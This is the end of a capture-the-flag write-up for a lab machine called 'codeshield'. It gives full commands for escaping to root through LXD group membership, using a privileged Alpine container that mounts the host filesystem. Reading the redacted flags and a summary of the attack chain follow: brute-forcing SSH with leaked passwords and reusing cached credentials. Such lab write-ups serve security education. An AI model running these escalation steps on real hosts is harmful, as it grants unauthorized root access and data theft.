172.21.32.1 - - [11/Apr/2026 00:22:05] "GET /alpine-v3.23-x86_64-20260411_0018.tar.gz HTTP/1.1" 200 -
```

The Alpine image is imported into LXD and a privileged container named "privesc" is instantiated with filesystem access to the host root:

```bash
earlyp@codeshield:/tmp$ lxd init --auto
earlyp@codeshield:/tmp$ lxc image import ./alpine-v3.23-x86_64-20260411_0018.tar.gz --alias alpine
Image imported with fingerprint: 1667d96f923ac8ce66a6bb7e3dc855456f8f683ccfbfa2e440a61e7cf096eb29
earlyp@codeshield:/tmp$ lxc init alpine privesc -c security.privileged=true
Creating privesc
earlyp@codeshield:/tmp$ lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to privesc
earlyp@codeshield:/tmp$ lxc start privesc
earlyp@codeshield:/tmp$ lxc exec privesc sh
~ # id;whoami;hostname
uid=0(root) gid=0(root)
root
privesc
```

The container now executes with root privileges and has direct access to the host filesystem mounted at /mnt/root. The root filesystem is navigated to retrieve sensitive files:

```bash
~ # cd /mnt/root/root
/mnt/root/root # ls -la
total 92
drwx------    9 root     root          4096 Aug 26  2023 .
drwxr-xr-x   19 root     root          4096 Aug 22  2023 ..
-rw-------    1 root     root             0 Aug 30  2023 .bash_history
-rw-r--r--    1 root     root          3106 Oct 15  2021 .bashrc
drwx------    2 root     root          4096 Aug 28  2023 .cache
drwxr-xr-x    3 root     root          4096 Aug 26  2023 .iredmail
drwx------    3 root     root          4096 Aug 23  2023 .launchpadlib
-rw-------    1 root     root            20 Aug 23  2023 .lesshst
drwxr-xr-x    3 root     root          4096 Aug 22  2023 .local
-r--------    1 root     root            45 Aug 26  2023 .my.cnf
-rw-r--r--    1 root     root            91 Aug 26  2023 .my.cnf-amavisd
-rw-r--r--    1 root     root            92 Aug 26  2023 .my.cnf-fail2ban
-rw-r--r--    1 root     root            93 Aug 26  2023 .my.cnf-iredadmin
-rw-r--r--    1 root     root            91 Aug 26  2023 .my.cnf-iredapd
-rw-r--r--    1 root     root            93 Aug 26  2023 .my.cnf-roundcube
-r--------    1 root     root            89 Aug 26  2023 .my.cnf-vmail
-r--------    1 root     root            94 Aug 26  2023 .my.cnf-vmailadmin
-rw-r--r--    1 root     root           161 Jul  9  2019 .profile
-rw-r--r--    1 root     root            66 Aug 26  2023 .selected_editor
drwx------    2 root     root          4096 Aug 22  2023 .ssh
-rw-r--r--    1 root     root             0 Aug 22  2023 .sudo_as_admin_successful
-rw-r--r--    1 root     root           290 Aug 26  2023 .wget-hsts
drwxr-xr-x    2 root     root          4096 Aug 26  2023 cowrie
-rw-r--r--    1 root     root          2528 Aug 26  2023 root.txt
drwx------    4 root     root          4096 Aug 22  2023 snap
/mnt/root/root # cat root.txt

             @@@
      @@@@@@@@@  @@@@@@
 @@@@@@@@@@@@@@          (@@
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗     ██████╗
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══╝  ██║     ██║  ██║
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝
        @@@@@@@   @@@
           @@@@@@@

  _______________________________________________________________________________________________________
 |  _ROOT FLAG!________________________________________________________________________________________  |
 | |                                                                                                   | |
 | | Edu[REDACTED]                                                                                     | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|

/mnt/root/root # cat /mnt/root/home/mitchellt/user.txt
             @@@
      @@@@@@@@@  @@@@@@
 @@@@@@@@@@@@@@          (@@
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗     ██████╗
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║
  @@@████████  @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝
        @@@@@@@   @@@
           @@@@@@@

  _______________________________________________________________________________________________________
 |  _USER FLAG!________________________________________________________________________________________  |
 | |                                                                                                   | |
 | | YoU[REDACTED]                                                                                     | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|
```

Both user and root flags are successfully retrieved, completing the full system compromise.

---

## Attack Chain Summary

1. **Reconnaissance:** Nmap scanning reveals a complex network infrastructure including multiple mail services, FTP, HTTP/HTTPS, and SSH on both standard and non-standard ports. Services are identified with their versions, enabling targeted exploitation.

2. **Vulnerability Discovery:** Anonymous FTP access permits retrieval of company documents including a weak password report and organizational policies. These documents provide both actionable intelligence and credential candidates. The corporate website discloses employee names and roles, enabling username generation through permutation tools.

3. **Exploitation:** SSH brute-force attacks against port 22222 succeed using credentials extracted from the weak password report. Initial access is obtained as user valdezk. Local reconnaissance reveals cached email credentials stored in Mozilla Thunderbird configuration files, providing secondary access credentials without elevated privilege requirements.

4. **Internal Enumeration:** Lateral movement to the mitchellt account succeeds using discovered email credentials. Examination of bash history reveals cleartext passwords passed to the su command, exposing credentials for additional user accounts. Permission to access the earlyp account is gained, which critically belongs to the lxd system group.

5. **Privilege Escalation:** The earlyp user's membership in the lxd group permits creation and management of Linux containers. A malicious Alpine Linux container is created with the security.privileged flag enabled and configured with direct filesystem mounting to the host root directory. Execution within this container provides unrestricted root access to the entire filesystem, enabling extraction of both user and root flags and complete system compromise.

---
